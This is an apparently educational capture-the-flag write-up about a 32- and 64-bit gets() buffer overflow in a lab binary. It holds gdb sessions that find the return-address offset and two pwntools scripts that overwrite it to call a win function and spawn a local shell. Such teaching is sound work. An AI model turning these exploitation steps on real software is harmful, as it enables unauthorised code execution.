# Challenge 4 writeup

## End goal
Call win function which gives us a shell

## Technique
Buffer overflow

## i386
This is a simple buffer overflow exercise, intending to get the beginner to learn about how buffer overflows can be dangerous.

If we load the binary up in Ghidra, we see the following output in main:
```c
undefined4 main(void)

{
  char local_48 [64];
  
  puts("What are you going to say?");
  gets(local_48);
  puts("Thank you, have a nice day!");
  return 0;
}
```
And we also notice another function, `win`: 
```c
void win(void)

{
  system("/bin/sh");
  return;
}
```
Whenever we do some binary exploitation, we're normally aiming to gain some type of RCE, or Remote Code Execution. This is normally done in the form of calling `system("/bin/sh")` or through the family of `exec` functions. As we see, we've got a handy function, aptly named `win` for us. So how would we call this function? It's not being called in `main`.

If we analyse `main`, we see that it prints a message, gets our input, and then prints another message. Let's just take a look at `gets` from the manpage

> BUGS         top

>       Never use gets().  Because it is impossible to tell without
>       knowing the data in advance how many characters gets() will read,
>       and because gets() will continue to store characters past the end
>       of the buffer, it is extremely dangerous to use.  It has been
>       used to break computer security.  Use fgets() instead.

>       For more information, see CWE-242 (aka "Use of Inherently
>       Dangerous Function") at
>       http://cwe.mitre.org/data/definitions/242.html

As we can see, even the manpages tell us not to use it. `gets` gets all the input the user provides up until a newline character is sent, or an EOF signal (which `gets` replaces with a null byte (\x00)). So this means that, if we provide more characters than `gets` is expecting, we can do some harmful things.

Let's showcase that in gdb:
```sh
euan@arch  chall4  gdb -q chall4_i386
GEF for linux ready, type `gef' to start, `gef config' to configure
91 commands loaded for GDB 10.1 using Python engine 3.9
Reading symbols from chall4_i386...
(No debugging symbols found in chall4_i386)
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
[+] Saved as '$_gef0'
gef➤  r
Starting program: chall4/chall4_i386 
What are you going to say?
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
Thank you, have a nice day!

Program received signal SIGSEGV, Segmentation fault.
0x61616173 in ?? ()

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0       
$ebx   : 0x61616171 ("qaaa"?)
$ecx   : 0xffffffff
$edx   : 0xffffffff
$esp   : 0xffffd250  →  "taaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabga[...]"
$ebp   : 0x61616172 ("raaa"?)
$esi   : 0xf7f9ae1c  →  0x001edd2c
$edi   : 0xf7f9ae1c  →  0x001edd2c
$eip   : 0x61616173 ("saaa"?)
$eflags: [zero carry parity adjust SIGN trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
──────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd250│+0x0000: "taaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabga[...]"	 ← $esp
0xffffd254│+0x0004: "uaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabha[...]"
0xffffd258│+0x0008: "vaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabia[...]"
0xffffd25c│+0x000c: "waaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabja[...]"
0xffffd260│+0x0010: "xaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabka[...]"
0xffffd264│+0x0014: "yaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaabla[...]"
0xffffd268│+0x0018: "zaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabma[...]"
0xffffd26c│+0x001c: "baabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabna[...]"
────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x61616173
────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall4_i386", stopped 0x61616173 in ?? (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern search $eip
[+] Searching '$eip'
[+] Found at offset 72 (little-endian search) likely
[+] Found at offset 69 (big-endian search)
```
So what have I just done there?

```sh
$ gdb -q ./chall4_i386
```
Opens gdb quietly (Doesn't showcase all of gdb copyright license *stuff*), and attach gdb to the program `./chall4_i386`.

```sh
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
[+] Saved as '$_gef0'
```
If we take a look at `help pattern`:
```sh
gef➤  help pattern
This command will create or search a De Bruijn cyclic pattern to facilitate
determining the offset in memory. The algorithm used is the same as the one
used by pwntools, and can therefore be used in conjunction.
Syntax: pattern (create|search) ARGS

List of pattern subcommands:

pattern create -- Generate a de Bruijn cyclic pattern. It will generate a pattern long of SIZE,
pattern offset -- Alias for 'pattern search': This command will create or search a De Bruijn cyclic pattern to facilitate
pattern search -- Search for the cyclic de Bruijn pattern generated by the `pattern create` command. The

Type "help pattern" followed by pattern subcommand name for full documentation.
Type "apropos word" to search for commands related to "word".
Type "apropos -v word" for full documentation of commands related to "word".
Command name abbreviations are allowed if unambiguous.
```
The `pattern` command outputs a De Bruijn cyclic pattern. Wikipedia defines a `De Bruijn pattern` as

> In combinatorial mathematics, a de Bruijn sequence of order n on a size-k alphabet A is a cyclic sequence in which every possible length-n string on A occurs exactly once as a substring (i.e., as a contiguous subsequence). 

Which sounds really complicated, however, it's just a string of size *n* which doesn't repeat. So as you can see with gdb, it goes 

> `aaaa`
> `aaab`
> `aaac`
> ...

So it never repeats. This is useful for us, as we can start to know where things are when we're overflowing it.

If we send in a De Bruijn pattern, we can see what the value of `eip` is. Why the eip? The eip is the 32 bit instruction pointer, and it points to the address that is currently being executed (or about to be).

If we put a break point at main (stop execution, break at this point), we can see that the eip points to the address that main is at:
```sh
 euan@arch  chall4  gdb -q chall4_i386
GEF for linux ready, type `gef' to start, `gef config' to configure
91 commands loaded for GDB 10.1 using Python engine 3.9
Reading symbols from chall4_i386...
(No debugging symbols found in chall4_i386)
gef➤  disas main
Dump of assembler code for function main:
   0x080491bb <+0>:	push   ebp
   0x080491bc <+1>:	mov    ebp,esp
   0x080491be <+3>:	push   ebx
   0x080491bf <+4>:	sub    esp,0x40
   0x080491c2 <+7>:	call   0x80490d0 <__x86.get_pc_thunk.bx>
   0x080491c7 <+12>:	add    ebx,0x2e39
   0x080491cd <+18>:	lea    eax,[ebx-0x1ff0]
   0x080491d3 <+24>:	push   eax
   0x080491d4 <+25>:	call   0x8049050 <puts@plt>
   0x080491d9 <+30>:	add    esp,0x4
   0x080491dc <+33>:	lea    eax,[ebp-0x44]
   0x080491df <+36>:	push   eax
   0x080491e0 <+37>:	call   0x8049040 <gets@plt>
   0x080491e5 <+42>:	add    esp,0x4
   0x080491e8 <+45>:	lea    eax,[ebx-0x1fd5]
   0x080491ee <+51>:	push   eax
   0x080491ef <+52>:	call   0x8049050 <puts@plt>
   0x080491f4 <+57>:	add    esp,0x4
   0x080491f7 <+60>:	mov    eax,0x0
   0x080491fc <+65>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x080491ff <+68>:	leave  
   0x08049200 <+69>:	ret    
End of assembler dump.
gef➤  break *main
Breakpoint 1 at 0x80491bb
gef➤  r
Starting program: chall4/chall4_i386 

Breakpoint 1, 0x080491bb in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0xf7f9d9e8  →  0xffffd2fc  →  0xffffd4bc  →  "PWD=chall4"
$ebx   : 0x0       
$ecx   : 0x2ac6b89d
$edx   : 0xffffd284  →  0x00000000
$esp   : 0xffffd24c  →  0xf7dcc08e  →  <__libc_start_main+270> add esp, 0x10
$ebp   : 0x0       
$esi   : 0xf7f9ae1c  →  0x001edd2c
$edi   : 0xf7f9ae1c  →  0x001edd2c
$eip   : 0x080491bb  →  <main+0> push ebp
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow resume virtualx86 identification]
$cs: 0x0023 $ss: 0x002b $ds: 0x002b $es: 0x002b $fs: 0x0000 $gs: 0x0063 
──────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0xffffd24c│+0x0000: 0xf7dcc08e  →  <__libc_start_main+270> add esp, 0x10	 ← $esp
0xffffd250│+0x0004: 0x00000001
0xffffd254│+0x0008: 0xffffd2f4  →  0xffffd48d  →  "/chall4/chall4_i386"
0xffffd258│+0x000c: 0xffffd2fc  →  0xffffd4bc  →  "PWD=chall4"
0xffffd25c│+0x0010: 0xffffd284  →  0x00000000
0xffffd260│+0x0014: 0xffffd294  →  0x6ce29e8d
0xffffd264│+0x0018: 0xf7ffdb40  →  0xf7ffdae0  →  0xf7f9f2d0  →  0xf7ffd980  →  0x00000000
0xffffd268│+0x001c: 0xf7f9f300  →  0x080482d9  →  "GLIBC_2.0"
────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
    0x80491b6 <win+32>         mov    ebx, DWORD PTR [ebp-0x4]
    0x80491b9 <win+35>         leave  
    0x80491ba <win+36>         ret    
 →  0x80491bb <main+0>         push   ebp
    0x80491bc <main+1>         mov    ebp, esp
    0x80491be <main+3>         push   ebx
    0x80491bf <main+4>         sub    esp, 0x40
    0x80491c2 <main+7>         call   0x80490d0 <__x86.get_pc_thunk.bx>
    0x80491c7 <main+12>        add    ebx, 0x2e39
────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall4_i386", stopped 0x80491bb in main (), reason: BREAKPOINT
──────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x80491bb → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  info register
eax            0xf7f9d9e8          0xf7f9d9e8
ecx            0x2ac6b89d          0x2ac6b89d
edx            0xffffd284          0xffffd284
ebx            0x0                 0x0
esp            0xffffd24c          0xffffd24c
ebp            0x0                 0x0
esi            0xf7f9ae1c          0xf7f9ae1c
edi            0xf7f9ae1c          0xf7f9ae1c
eip            0x80491bb           0x80491bb <main>
eflags         0x246               [ PF ZF IF ]
cs             0x23                0x23
ss             0x2b                0x2b
ds             0x2b                0x2b
es             0x2b                0x2b
fs             0x0                 0x0
gs             0x63                0x63
gef➤  info register eip
eip            0x80491bb           0x80491bb <main>
```
That's a lot of information up above. But `gef` breaks it down nicely - it splits up the parts into (this is the default configuration):

> registers
> stack
> code
> threads
> trace

And the colours (when you do this yourself if you use gef) are defined at the top

> [ Legend: Modified register | Code | Heap | Stack | String ]

Which doesn't come out here, but oh well.

As we can see at the top (and I've shown at the bottom as well), we can see that our `eip` shows this:
```sh
$eip   : 0x080491bb  →  <main+0> push ebp
```
And if we disassemble `main`:
```sh
gef➤  disas main
Dump of assembler code for function main:
=> 0x080491bb <+0>:	push   ebp
```
We see that eip points to that address (as well as gef nicely putting an arrow to where we are).

So therefore, what if we made the `eip` point to the `win` function? We therefore execute the function, and therefore execute the function `system("/bin/sh")`, getting us our shell.

So let's send in the De Bruijn pattern, and see where our eip end up.
```sh
 euan@arch  chall4  gdb -q chall4_i386
...
gef➤  pattern create 200
[+] Generating a pattern of 200 bytes
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
gef➤  r
Starting program: chall4/chall4_i386 
What are you going to say?
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
Thank you, have a nice day!

Program received signal SIGSEGV, Segmentation fault.
0x61616173 in ?? ()
...
$eip   : 0x61616173 ("saaa"?)
...
gef➤  pattern search $eip
[+] Searching '$eip'
[+] Found at offset 72 (little-endian search) likely
[+] Found at offset 69 (big-endian search) 
```
So what we've done, is we've found out that we need to input 72 characters to then modify the `eip` register. Let's test that:
```sh
gef➤  python print("A"*72 + "BBBB")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
gef➤  r
Starting program: /chall4/chall4_i386 
What are you going to say?
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB
Thank you, have a nice day!

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
──────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$eax   : 0x0       
$ebx   : 0x41414141 ("AAAA"?)
$ecx   : 0xffffffff
$edx   : 0xffffffff
$esp   : 0xffffd250  →  0x00000000
$ebp   : 0x41414141 ("AAAA"?)
$esi   : 0xf7f9ae1c  →  0x001edd2c
$edi   : 0xf7f9ae1c  →  0x001edd2c
$eip   : 0x42424242 ("BBBB"?)
...
[!] Cannot disassemble from $PC
[!] Cannot access memory at address 0x42424242
────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall4_i386", stopped 0x42424242 in ?? (), reason: SIGSEGV
gef➤  
```
Bingo, we've found that we can modify eip, as 0x42 is B in ascii.

So now to find the location of the `win` function. This is rather easy with gdb:
```sh
gef➤  disas win
Dump of assembler code for function win:
   0x08049196 <+0>:	push   ebp
   0x08049197 <+1>:	mov    ebp,esp
   0x08049199 <+3>:	push   ebx
   0x0804919a <+4>:	call   0x8049201 <__x86.get_pc_thunk.ax>
   0x0804919f <+9>:	add    eax,0x2e61
   0x080491a4 <+14>:	lea    edx,[eax-0x1ff8]
   0x080491aa <+20>:	push   edx
   0x080491ab <+21>:	mov    ebx,eax
   0x080491ad <+23>:	call   0x8049060 <system@plt>
   0x080491b2 <+28>:	add    esp,0x4
   0x080491b5 <+31>:	nop
   0x080491b6 <+32>:	mov    ebx,DWORD PTR [ebp-0x4]
   0x080491b9 <+35>:	leave  
   0x080491ba <+36>:	ret    
End of assembler dump.
gef➤  x win
0x8049196 <win>:	0x53e58955
```
As you can see, the start of the disassembly of `win` is the function we want to input. Now, we need to input that into our payload. I don't like doing that manually, so let's script this:
```
from pwn import *

context.binary = "./chall4_i386"
e = context.binary
p = process(e.path)

payload = b"A"*72
payload += p32(e.symbols["win"])

p.sendline(payload)
p.interactive()
```
Where we're using pwntools to help with our exploitation.

We tell it that the binary in question is `./chall4_i386`, and we're getting the process of this, so that we can send data to the binary.

We start our payload with `A*72`, and then packing the address for `win` in 32 bit. We need to pack it, as the binary is little endian, that is, it reads from right to left (instead of reading left to right, like in the UK or USA, etc.). The `e.symbols` gets all the symbols that are found in the binary, and puts it into a dictionary with `name: address` pair.

We then send this payload, and can the interact with the binary. Running that:
```sh
 euan@arch  chall4  python exploit_i386.py 
[*] 'chall4/chall4_i386'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Starting local process '/chall4/chall4_i386': pid 14985
[*] Switching to interactive mode
What are you going to say?
Thank you, have a nice day!
$ ls
chall4_i386  chall4_x86_64  exploit_i386.py  exploit-x86_64.py    vuln.c
$ id
uid=1000(euan) gid=1000(euan) groups=1000(euan),0(root),108(vboxusers),969(tablet)
$ whoami
euan
```
And boom, we've successfully exploited the binary!!

## x86_64
Now onto 64 bit.

Again, follow the same formula - send in a De Bruijn pattern, find the offset for rip (registers now begin with `r` as we're now dealing with 64 bit), which also happens to be 72. We now do the same thing as the i386 exploit, but pack the address with 64 bits, rather than 32 bits. As shown:
```sh
 euan@arch  chall4  gdb -q chall4_x86_64 
GEF for linux ready, type `gef' to start, `gef config' to configure
91 commands loaded for GDB 10.1 using Python engine 3.9
Reading symbols from chall4_x86_64...
(No debugging symbols found in chall4_x86_64)
gef➤  pattern create 100
[+] Generating a pattern of 100 bytes
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
[+] Saved as '$_gef0'
gef➤  r
Starting program: /chall4/chall4_x86_64 
What are you going to say?
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
Thank you, have a nice day!

Program received signal SIGSEGV, Segmentation fault.
0x0000000000401190 in main ()

[ Legend: Modified register | Code | Heap | Stack | String ]
──────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
$rax   : 0x0               
$rbx   : 0x0               
$rcx   : 0x00007ffff7ec6f67  →  0x5177fffff0003d48 ("H="?)
$rdx   : 0x0               
$rsp   : 0x00007fffffffe0b8  →  "jaaaaaaakaaaaaaalaaaaaaamaaa"
$rbp   : 0x6161616161616169 ("iaaaaaaa"?)
$rsi   : 0x00000000004052a0  →  "Thank you, have a nice day!\n"
$rdi   : 0x00007ffff7f9b4f0  →  0x0000000000000000
$rip   : 0x0000000000401190  →  <main+55> ret 
$r8    : 0x1c              
$r9    : 0x0               
$r10   : 0x40              
$r11   : 0x246             
$r12   : 0x0000000000401060  →  <_start+0> endbr64 
$r13   : 0x0               
$r14   : 0x0               
$r15   : 0x0               
$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
$cs: 0x0033 $ss: 0x002b $ds: 0x0000 $es: 0x0000 $fs: 0x0000 $gs: 0x0000 
──────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
0x00007fffffffe0b8│+0x0000: "jaaaaaaakaaaaaaalaaaaaaamaaa"	 ← $rsp
0x00007fffffffe0c0│+0x0008: "kaaaaaaalaaaaaaamaaa"
0x00007fffffffe0c8│+0x0010: "laaaaaaamaaa"
0x00007fffffffe0d0│+0x0018: 0x000000006161616d ("maaa"?)
0x00007fffffffe0d8│+0x0020: 0x0000004000000000
0x00007fffffffe0e0│+0x0028: 0x0000000000000000
0x00007fffffffe0e8│+0x0030: 0x736fff1a9a414df5
0x00007fffffffe0f0│+0x0038: 0x0000000000401060  →  <_start+0> endbr64 
────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:64 ────
     0x401181 <main+40>        movabs ds:0xfffffea6e800000e, al
     0x40118a <main+49>        mov    eax, 0x0
     0x40118f <main+54>        leave  
 →   0x401190 <main+55>        ret    
[!] Cannot disassemble from $PC
────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
[#0] Id 1, Name: "chall4_x86_64", stopped 0x401190 in main (), reason: SIGSEGV
──────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
[#0] 0x401190 → main()
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────
gef➤  pattern search $rsp
[+] Searching '$rsp'
[+] Found at offset 72 (little-endian search) likely
[+] Found at offset 65 (big-endian search)
```
We use the rsp register (stack pointer) as the address doesn't go into rip, which I'm not too sure the reason for that. But if we take a look at the i386 binary, and set a breakpoint before the `leave` function, we see that the `eip` gets it's address from `esp`. So therefore, we check the rsp if we don't have straight access to rip.

So now, for the 64 bit binary, our exploit looks like this:
```py
from pwn import *

context.binary = "./chall4_x86_64"
e = context.binary
p = process(e.path)
libc = e.libc

payload = b"A"*72
payload += p64(e.symbols["win"])

p.sendline(payload)
p.interactive()
```
And running that
```sh
 euan@arch  chall4  python exploit-x86_64.py 
[*] '/chall4/chall4_x86_64'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
[+] Starting local process '/chall4/chall4_x86_64': pid 15339
[*] Switching to interactive mode
What are you going to say?
Thank you, have a nice day!
$ ls
chall4_i386  chall4_x86_64  exploit_i386.py  exploit-x86_64.py    vuln.c
$ id
uid=1000(euan) gid=1000(euan) groups=1000(euan),0(root),108(vboxusers),969(tablet)
$ uname -0a
uname: invalid option -- '0'
Try 'uname --help' for more information.
$ uname -a
Linux arch 5.10.4-arch2-1 #1 SMP PREEMPT Fri, 01 Jan 2021 05:29:53 +0000 x86_64 GNU/Linux
```
Bingo, we're successfully exploited the 64 bit program!!
